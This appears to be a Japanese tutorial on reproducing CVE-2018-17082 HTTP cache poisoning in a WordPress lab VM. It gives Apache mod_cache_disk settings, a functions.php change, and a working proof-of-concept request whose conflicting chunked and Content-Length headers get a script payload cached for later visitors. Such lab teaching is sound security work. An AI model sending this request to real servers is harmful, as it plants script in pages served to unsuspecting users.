# CVE-2018-17082に学ぶHTTPキャッシュ汚染攻撃

- 本日お伝えしたいこと
    - CVE-2018-17082のおさらい
    - CVE-2018-17082 によるHTTPキャッシュ汚染攻撃の方法
- 前提となる環境
    - 徳丸本VM（WordPressインストール済み）
    - OWASP ZAP (Burp Suite等でも可）

# 設定の方法

## mod_disk_cacheの設定

```
$ sudo a2enmod cache_disk
$ cd /etc/apache2/mods-enabled/
$ sudo vi cache_disk.conf
```
 cache_disk.confの内容は下記

 ```
<IfModule mod_cache_disk.c>
        CacheRoot /var/cache/apache2/mod_cache_disk
        CacheEnable disk /
        CacheDisable /wp-admin/
        CacheDisable /wp-content/
        CacheDisable /wp-includes/
        CacheDetailHeader On

        # No Cache when Set-Cookie headers
        CacheIgnoreHeaders Set-Cookie

        # Cache when Request with no-cache header
        CacheIgnoreCacheControl On

        CacheDirLevels 2
        CacheDirLength 1
</IfModule>
 ```

```
$ sudo systemctl restart apache2
$ cd /var/www/html/wp/wp-content/themes/twentyseventeen/
$ sudo vi functions.php
```

functions.phpの末尾に下記を追加

```
// Add Header for mod_cahce
add_action('template_redirect', function () {
    if (! is_user_logged_in()) {
        header('Cache-Control: s-maxage=60');
    }
});
```

これで準備完了

# 攻撃1 (攻撃者、能動的) 

PoC（攻撃文字列）は下記（Transfer-Encoding: chunked以下の部分）
（最後の行は改行を削除しておく）

```
GET http://example.jp:88/wp/ HTTP/1.1
User-Agent: Mozilla/5.0
Transfer-Encoding: chunked
Content-Length: 32
Host: example.jp:88

<script>alert('Hacked')</script>
```

# 攻撃2（被害者、受動的）

単に下記コンテンツを閲覧するだけ

http://example.jp:88/wp/


動画URL : https://youtu.be/jhyB5bcrdyo

YouTubeチャンネル　[徳丸浩のウェブセキュリティ講座](https://www.youtube.com/channel/UCLNW6Bo_YU3TxnzsII2gEDA)
